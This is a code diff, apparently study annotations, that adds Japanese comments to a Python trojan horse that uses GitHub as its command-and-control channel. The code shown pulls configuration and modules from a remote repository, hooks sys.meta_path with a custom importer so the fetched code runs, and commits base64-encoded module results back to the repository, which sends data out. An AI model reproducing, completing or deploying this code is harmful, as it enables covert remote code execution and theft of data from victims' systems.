@@ -50,6 +50,8 @@ def connect_to_github():
 
     return gh, repo, branch
 
+
+#リモートからリポジトリのファイルを取得、ローカルに読み込む
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
@@ -64,6 +66,7 @@ def get_file_contents(filepath):
 
     return None
 
+#リモートからどのモジュールを実行すべきか
 def get_trojan_config():
     global configured
     config_json = get_file_contents(trojan_config)
@@ -76,28 +79,30 @@ def get_trojan_config():
 
     return config
 
+#データをリモートに保存
 def store_module_result(data):
 
     gh, repo, branch = connect_to_github()
     remote_path = "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 100000))
-    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
+    repo.create_file(remote_path, "trojan_result", base64.b64encode(data))
 
     return
 
+
+#モジュールの実行
 def module_runner(module):
 
     task_queue.put(1)
     result = sys.modules[module].run()
     task_queue.get()
-
     #レポジトリに結果を保存する
     store_module_result(result.encode())
 
     return
 
 #トロイの木馬のメインループ
-sys.meta_path.insert(0, GitImporter())
 
+sys.meta_path.insert(0, GitImporter())
 while True:
 
     if task_queue.empty():
